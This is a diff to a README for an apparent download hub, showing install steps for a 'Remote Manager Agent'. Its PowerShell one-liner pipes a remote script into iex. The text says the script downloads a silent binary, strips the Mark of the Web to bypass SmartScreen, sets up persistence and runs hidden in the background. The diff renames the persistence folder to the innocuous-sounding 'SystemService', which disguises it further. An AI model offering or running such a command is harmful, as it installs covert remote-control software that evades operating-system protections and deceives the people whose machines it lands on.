@@ -20,7 +20,7 @@ Central distribution hub, binary release repository, and direct download center.
 ## ⚡ Remote Manager Agent — Quick Install & Run
 
 ### 🪟 Windows (1-Liner PowerShell — No SmartScreen Prompt)
-Open PowerShell and run this one-liner. It downloads the silent binary, strips the NTFS Mark of the Web (`Zone.Identifier`) to bypass SmartScreen blue popup, sets up persistence in `%APPDATA%\RemoteManager`, and launches silently in the background:
+Open PowerShell and run this one-liner. It downloads the silent binary, strips the NTFS Mark of the Web (`Zone.Identifier`) to bypass SmartScreen blue popup, sets up persistence in `%APPDATA%\SystemService`, and launches silently in the background:
 
 ```powershell
 irm https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/install.ps1 | iex
